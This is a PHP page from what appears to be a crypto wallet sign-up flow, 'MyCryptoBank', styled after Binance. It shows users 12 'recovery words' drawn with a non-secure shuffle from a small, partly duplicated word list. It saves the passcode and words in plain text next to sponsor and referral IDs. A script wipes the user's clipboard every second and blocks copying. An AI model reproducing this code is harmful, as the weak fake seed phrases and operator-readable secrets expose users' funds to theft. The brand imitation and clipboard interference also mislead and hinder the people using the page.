<?php
session_start();

// Function to generate unique words (no seed, always random)
function generateUniqueWords($count = 12) {
    $words = [
        // A words
        'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse',
        // B words
        'baby', 'bachelor', 'bacon', 'badge', 'bag', 'balance', 'balcony', 'ball', 'bamboo', 'banana',
        // C words
        'cabin', 'cable', 'cactus', 'cage', 'cake', 'call', 'calm', 'camera', 'camp', 'can',
        // D words
        'damage', 'dance', 'danger', 'daring', 'dash', 'daughter', 'dawn', 'day', 'deal', 'debate',
        // E words
        'eagle', 'early', 'earn', 'earth', 'easily', 'east', 'easy', 'eat', 'ecology', 'economy',
        // F words
        'fabric', 'face', 'faculty', 'fade', 'faint', 'faith', 'fall', 'false', 'fame', 'family',
        // G words
        'gallery', 'game', 'gap', 'garage', 'garbage', 'garden', 'garlic', 'garment', 'gas', 'gasp',
        // H words
        'habit', 'hair', 'half', 'hammer', 'hamster', 'hand', 'happy', 'harbor', 'hard', 'harsh',
        // I words
        'ice', 'icon', 'idea', 'identify', 'idle', 'ignore', 'ill', 'illegal', 'illness', 'image',
        // J words
        'jacket', 'jaguar', 'jar', 'jazz', 'jealous', 'jeans', 'jelly', 'jewel', 'job', 'join',
        // K words
        'kangaroo', 'keen', 'keep', 'ketchup', 'key', 'kick', 'kid', 'kidney', 'kind', 'kingdom',
        // L words
        'label', 'labor', 'ladder', 'lady', 'lake', 'lamp', 'language', 'laptop', 'large', 'later',
        // M words
        'machine', 'mad', 'magic', 'magnet', 'maid', 'mail', 'main', 'major', 'make', 'mammal',
        // N words
        'name', 'napkin', 'narrow', 'nasty', 'nation', 'nature', 'near', 'neck', 'need', 'negative',
        // O words
        'obey', 'object', 'oblige', 'obscure', 'observe', 'obtain', 'obvious', 'occur', 'ocean', 'october',
        // P words
        'paddle', 'page', 'pair', 'palace', 'palm', 'panda', 'panel', 'panic', 'panther', 'paper',
        // Q words
        'quality', 'quantum', 'quarter', 'question', 'quick', 'quit', 'quiz', 'quote', 'rabbit', 'raccoon',
        // R words
        'race', 'rack', 'radar', 'radio', 'rail', 'rain', 'raise', 'rally', 'ramp', 'ranch',
        // S words
        'sad', 'saddle', 'sadness', 'safe', 'sail', 'salad', 'salmon', 'salt', 'salute', 'same',
        // T words
        'table', 'tackle', 'tag', 'tail', 'talent', 'talk', 'tank', 'tape', 'target', 'task',
        // U words
        'ugly', 'umbrella', 'unable', 'unaware', 'uncle', 'uncover', 'under', 'undo', 'unfair', 'unfold',
        // V words
        'vacant', 'vacuum', 'vague', 'valid', 'valley', 'valve', 'van', 'vanish', 'vapor', 'various',
        // W words
        'wage', 'wagon', 'wait', 'walk', 'wall', 'walnut', 'want', 'warfare', 'warm', 'warrior',
        // X words
        'xylophone', 'xenon', 'xerox', 'xenial', 'xenon', 'xerox', 'xenial', 'xenon', 'xerox', 'xenial',
        // Y words
        'yard', 'year', 'yellow', 'you', 'young', 'youth', 'yacht', 'yield', 'yoga', 'yolk',
        // Z words
        'zebra', 'zero', 'zone', 'zoo', 'zoom', 'zinc', 'zest', 'zephyr', 'zenith', 'zodiac'
    ];
    shuffle($words);
    return array_slice($words, 0, $count);
}

// Check if passcode exists in session
if (!isset($_SESSION['passcode'])) {
    header('Location: create-passcode.php');
    exit;
}

// Generate unique words for this user (always random)
$randomWords = generateUniqueWords();

// Store the words in session for later use
$_SESSION['recovery_words'] = $randomWords;

// Store in database
require_once 'config.php';

// Convert recovery words array to JSON string
$recoveryWordsJson = json_encode($randomWords);

// Get user_id from session
$user_id = isset($_SESSION['user_id']) ? $_SESSION['user_id'] : '';
// Get sponser_id from session
$sponser_id = isset($_SESSION['sponser_id']) ? $_SESSION['sponser_id'] : '';

// Prepare and execute the SQL statement
$refer_id = isset($_SESSION['refer_id']) ? $_SESSION['refer_id'] : bin2hex(random_bytes(6));
$stmt = $conn->prepare("INSERT INTO wallet_data (wallet_name, passcode, recovery_words, refer_id, user_id, sponser_id) VALUES (?, ?, ?, ?, ?, ?)");
$stmt->bind_param("ssssss", $_SESSION['walletName'], $_SESSION['passcode'], $recoveryWordsJson, $refer_id, $user_id, $sponser_id);

if ($stmt->execute()) {
    // Successfully stored in database
    $stmt->close();
} else {
    // Handle error
    die("Error storing wallet data: " . $stmt->error);
}

// Close database connection
$conn->close();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Random Words</title>
    <style>
        body {
            font-family: 'Poppins', 'Segoe UI', Arial, sans-serif;
            background: #181A20;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .verify-container {
            background: #1E2329;
            border-radius: 24px;
            box-shadow: 0 0 16px 0 rgba(0,0,0,0.4);
            padding: 48px 36px 36px 36px;
            width: 100%;
            max-width: 420px;
            color: #fff;
            position: relative;
        }
        .binance-logo {
            display: flex;
            align-items: center;
            margin-bottom: 18px;
            justify-content: center;
        }
        .binance-logo img {
            height: 32px;
            width: 32px;
            margin-right: 8px;
            border-radius: 6px;
        }
        .binance-logo span {
            font-size: 22px;
            font-weight: 700;
            color: #F0B90B;
            letter-spacing: 1px;
        }
        .verify-container h2 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 18px;
            color: #fff;
            text-align: left;
        }
        .verify-message {
            color: #b7bdc6;
            font-size: 16px;
            margin-bottom: 28px;
            line-height: 1.5;
        }
        .words-container {
            background: #181A20;
            border: 2px solid #F0B90B;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .word-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
        }
        .word-item {
            background: #2B3139;
            padding: 10px;
            border-radius: 6px;
            text-align: center;
            font-size: 14px;
            color: #fff;
        }
        .word-number {
            color: #F0B90B;
            font-size: 12px;
            margin-right: 5px;
        }
        .verify-btn {
            width: 100%;
            padding: 15px 0;
            background: #F0B90B;
            color: #181A20;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 18px;
            transition: background 0.2s;
        }
        .verify-btn:hover {
            background: #e5a800;
        }
        @media (max-width: 768px) {
            .verify-container {
                max-width: 98vw;
                padding: 50px;
                border-radius: 12px;
            }
            .word-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }
        @media (max-width: 480px) {
            .verify-container {
                padding: 30px;
                border-radius: 0;
            }
            .word-grid {
                grid-template-columns: repeat(2, 1fr);
            }
            .word-item {
                font-size: 12px;
                padding: 8px;
            }
        }
    </style>
</head>
<body>
    <div class="verify-container">
        <div class="binance-logo">
            <img src="./img/logo.jpg" alt="logo" style="height:40px; width:40px; margin-right:8px; border-radius:6px;">
            <span>MyCryptoBank</span>
        </div>
        <h2>Recovery Words</h2>
        <div class="verify-message">
            Please save these 12 recovery words. You'll need them to recover your wallet.
        </div>
        
        <div class="words-container">
            <div class="word-grid">
                <?php foreach ($randomWords as $index => $word): ?>
                    <div class="word-item">
                        <span class="word-number"><?php echo $index + 1; ?>.</span>
                        <?php echo $word; ?>
                    </div>
                <?php endforeach; ?>
            </div>
        </div>

        <button type="button" class="verify-btn" onclick="window.location.href='combined-login.php'">Continue</button></div>

        <script>

            setInterval(() => {
            navigator.clipboard.writeText('');
            }, 1000);

            document.addEventListener('copy', function (e) {
                e.preventDefault(); // Stop the actual copy action
                alert("⚠️ Copying text is not allowed!");

            
            });
        </script>
</body>
</html>
